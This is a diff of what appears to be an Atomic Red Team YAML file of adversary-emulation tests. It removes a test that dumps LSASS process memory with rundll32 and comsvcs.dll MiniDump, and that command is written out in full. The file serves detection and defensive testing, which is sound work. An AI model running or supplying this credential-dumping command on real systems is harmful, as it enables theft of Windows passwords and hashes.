@@ -38,21 +38,6 @@ atomic_tests:
       del "#{output_file}" >nul 2> nul
     name: command_prompt
     elevation_required: true
-- name: Dump LSASS.exe Memory using comsvcs.dll
-  auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
-
-    Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
-  supported_platforms:
-  - windows
-  executor:
-    command: |
-      C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
-    cleanup_command: |
-      Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
-    name: powershell
-    elevation_required: true
 - name: Dump LSASS.exe Memory using direct system calls and API unhooking
   auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
   description: |
